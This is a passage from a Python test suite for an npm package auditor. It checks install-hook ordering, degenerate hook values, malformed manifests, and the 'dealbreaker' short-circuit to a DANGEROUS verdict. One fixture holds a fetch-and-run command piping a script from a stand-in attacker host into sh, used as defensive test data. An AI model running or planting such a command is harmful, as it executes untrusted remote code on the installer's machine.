    Two audits of identical bytes could therefore disagree on the order of this
    field, on which missing reference the dealbreaker rationale names, and on the
    hypothesize prompt, which renders this list verbatim (phases.py "## Entry
    points"). The manifest here declares the hooks in the reverse of run order to
    prove the output follows npm's order and not the manifest's.

    The constant is asserted directly as well, and that is not a restatement: a
    frozenset restores the defect while still yielding npm's order in 1 process out
    of 6 (measured — the observable-order assertion below survived 1 of 8 runs
    against that mutation), so the observable assertion alone is a flaky pin on a
    non-flaky bug."""
    assert INSTALL_TIME_HOOKS == ("preinstall", "install", "postinstall")
    package = _write(
        tmp_path,
        {
            "package.json": _manifest(
                scripts={
                    "postinstall": "node third.js",
                    "install": "node second.js",
                    "preinstall": "node first.js",
                }
            ),
            "index.js": SETUP_SOURCE,
            "first.js": SETUP_SOURCE,
            "second.js": SETUP_SOURCE,
            "third.js": SETUP_SOURCE,
        },
    )
    inventory = await analyze_inventory(package)
    assert inventory.entryPoints.install == ["first.js", "second.js", "third.js"]


@pytest.mark.parametrize(
    "command",
    [
        'sh "unbalanced',
        "sh $SCRIPT",
        "sh ${npm_package_config_target}",
        "node",
        "&&",
        "   ",
        "install.sh",
        "node_modules/.bin/patch-package",
    ],
)
async def test_a_degenerate_hook_value_is_a_gap_and_never_a_crash(tmp_path, command: str) -> None:
    """C27: the values that have no target to resolve at all — unbalanced quoting,
    a path the shell computes at run time, an interpreter with no operand, an
    operator on its own, whitespace, a bare name (a PATH lookup: npm puts
    node_modules/.bin on PATH and the package root NOT on it, so `install.sh` alone
    is not this package's file), and a path into a SKIP_DIRS directory, whose bytes
    classify_files never inventoried — so "absent from files" would not mean absent
    from the tarball, and calling it missing would be a false dealbreaker on
    `patch-package`. None of them may raise, and none may pass as clean: whitespace
    declares no command so there is nothing to run, and every other one is a gap.
    This is the class that keeps the INVARIANT total — a value this module cannot
    understand degrades to "we could not look", the only safe direction."""
    package = _write(
        tmp_path,
        {"package.json": _manifest(scripts={"install": command}), "index.js": SETUP_SOURCE},
    )
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is None
    assert inventory.entryPoints.install == []
    checks = {flag.check for flag in inventory.flags}
    assert ("install-coverage-gap" in checks) is bool(command.strip())


# --------------------------------------------------------------------------- #
# The scripts block — boundaries
# --------------------------------------------------------------------------- #


async def test_empty_scripts_block_trips_nothing(tmp_path) -> None:
    """C12: `"scripts": {}` — present but empty. No hook, so no lifecycle flag."""
    package = _write(
        tmp_path, {"package.json": _manifest(scripts={}), "index.js": SETUP_SOURCE}
    )
    inventory = await analyze_inventory(package)
    assert inventory.scripts == {}
    assert inventory.dealbreaker is None
    assert inventory.flags == []


async def test_absent_scripts_block_trips_nothing(tmp_path) -> None:
    """C13: no `scripts` key at all — the common case for a library — behaves as
    the empty block, with nothing to install-check."""
    package = _write(tmp_path, {"package.json": _manifest(), "index.js": SETUP_SOURCE})
    inventory = await analyze_inventory(package)
    assert inventory.scripts == {}
    assert inventory.entryPoints.install == []
    assert inventory.dealbreaker is None
    assert inventory.flags == []


async def test_non_string_script_values_are_dropped(tmp_path) -> None:
    """C14: npm requires string script values; a manifest with a list, a null and
    a number keeps neither for the checks and raises nothing."""
    package = _write(
        tmp_path,
        {
            "package.json": _manifest(
                scripts={"install": ["node", "setup.js"], "prepare": None, "postinstall": 7}
            ),
            "index.js": SETUP_SOURCE,
        },
    )
    inventory = await analyze_inventory(package)
    assert inventory.scripts == {}
    assert inventory.dealbreaker is None
    assert inventory.flags == []


# --------------------------------------------------------------------------- #
# Manifest health × the checks
# --------------------------------------------------------------------------- #


async def test_unparseable_manifest_declaring_a_pipe_ends_the_audit(audit) -> None:
    """C15: the interaction that used to be a silent gap. This manifest's TEXT
    declares a piped install hook, but it does not parse. Before 95cfb38 the
    failure became `{}`, so empty scripts + an empty install list made BOTH
    dealbreaker checks pass trivially and the audit ran on with no manifest
    knowledge — a swallow that could only bias toward SAFE. Now it is a located,
    retryable 0031 and NO report exists to be read as clean."""
    truncated = '{"name": "x", "scripts": {"install": "curl https://evil.example/i.sh | sh"'
    with pytest.raises(AuditIncompleteError) as excinfo:
        await audit({"package.json": truncated, "index.js": SETUP_SOURCE})
    assert excinfo.value.stage == "inventory"
    assert excinfo.value.code == "NPMGUARD-0031"
    assert excinfo.value.retryable is True
    assert "not valid JSON" in str(excinfo.value)
    assert "verdict_reached" not in _frame_types(audit.frames)


# --------------------------------------------------------------------------- #
# The short-circuit — what ships
# --------------------------------------------------------------------------- #

DEALBREAKER_PACKAGES = {
    "shell-pipe": _hook_package(PIPED_SCRIPTS["curl-into-sh"]),
    "missing-install-script": {
        "package.json": _manifest(scripts={"preinstall": BENIGN_HOOK}),
        "index.js": SETUP_SOURCE,
    },
}


@pytest.mark.parametrize("check", sorted(DEALBREAKER_PACKAGES))
async def test_dealbreaker_report_is_coherent_with_zero_hypotheses(audit, check: str) -> None:
    """C16: both checks reach the same hardcoded-DANGEROUS short-circuit, and what
    ships is asserted as a whole report — zero hypotheses is the contract on this
    path (§9), so a consumer branching on `verdict` gets a coherent object:
    dealbreaker set, counts all zero, no fileSummaries, and a trace of exactly the
    two phases that ran."""
    result = await audit(DEALBREAKER_PACKAGES[check])
    report = result.report
    assert report.verdict == "DANGEROUS"
    assert report.schemaVersion == 2
    assert report.dealbreaker is not None
    assert report.dealbreaker.check == check
    assert report.rationale == (
        f"Dealbreaker: {report.dealbreaker.check} — {report.dealbreaker.detail}"
    )
    assert report.counts.model_dump() == {
        "total": 0,
        "open": 0,
        "inProgress": 0,
        "confirmed": 0,
        "refuted": 0,
        "deferred": 0,
    }
    assert report.hypotheses == []
    assert report.confirmedHypIds == []
    assert report.fileSummaries == []
    assert [phase.phase for phase in report.trace] == ["resolve", "inventory"]


async def test_dealbreaker_emits_no_frame_from_a_later_phase(audit) -> None:
    """C17: what a live viewer receives. The inventory frames arrive, nothing from
    intent/flag/hypothesize/orchestrator does, and run() emits no terminal frame —
    the service owns that transition. The provider has no script for any role, so
    a later phase would have failed loudly rather than emitting anything."""
    result = await audit(DEALBREAKER_PACKAGES["shell-pipe"])
    types = _frame_types(result.frames)
    assert types == [
        "audit_started",
        "phase_started",
        "phase_completed",
        "dependencies_provisioned",
        "phase_started",
        "phase_completed",
        "file_list",
        "inventory_meta",
    ]
    phases = [frame["phase"] for frame in result.frames if frame["type"].startswith("phase_")]
    assert phases == ["resolve", "resolve", "inventory", "inventory"]
    later = {
        "intent_extracted",
        "file_analyzing",
        "file_verdict",
        "triage_complete",
        "graph_built",
        "hypothesis_emitted",
        "verdict_reached",
        "audit_error",
    }
    assert not later & set(types)


async def test_dealbreaker_report_is_persistable_under_its_real_version(
    audit, tmp_path, monkeypatch
) -> None:
    """C18: §9's last paragraph, proven. The report is built by hand, bypassing
    _report(), yet its two-entry trace still carries the inventory PhaseLog whose
    output embeds `metadata` — so the store recovers the concrete version and
    files the report under it, never a latest.json alias. DATA_DIR is an
    import-time constant, so it is re-pointed on the module here."""
    result = await audit(DEALBREAKER_PACKAGES["shell-pipe"])
    monkeypatch.setattr(report_store, "DATA_DIR", tmp_path / "reports")
    assert report_store.extract_report_version(result.report) == PACKAGE_VERSION
    assert report_store.save_report(PACKAGE_NAME, "latest", result.report) == PACKAGE_VERSION
    persisted = tmp_path / "reports" / PACKAGE_NAME / f"{PACKAGE_VERSION}.json"
    assert json.loads(persisted.read_text(encoding="utf-8"))["verdict"] == "DANGEROUS"


async def test_package_without_a_dealbreaker_proceeds_to_the_normal_pipeline(audit) -> None:
    """C19: the contrast that proves the short-circuit is a branch and not the
    path. The same rig, a benign hook, and a scripted LLM: intent and flag run
    (their frames and PhaseLogs appear), dealbreaker is None, and the verdict comes
    from the graph instead of a hardcoded string."""
    provider = ScriptedLlm(
        {
            "intent": [
                json.dumps(
                    {
                        "statedPurpose": "a fixture package",
                        "expectedCapabilities": [],
                        "rationale": "from the manifest",
                    }
                )
            ],
            "flag": [json.dumps({"summary": "nothing of note", "capabilities": [], "flags": []})],
        }
    )
    result = await audit(_hook_package(BENIGN_HOOK), provider=provider)
    assert result.report.dealbreaker is None
    assert result.report.verdict == "SAFE"
    assert [phase.phase for phase in result.report.trace] == [
        "resolve",
        "inventory",
        "intent-extraction",
        "flag",
    ]
    assert "intent_extracted" in _frame_types(result.frames)
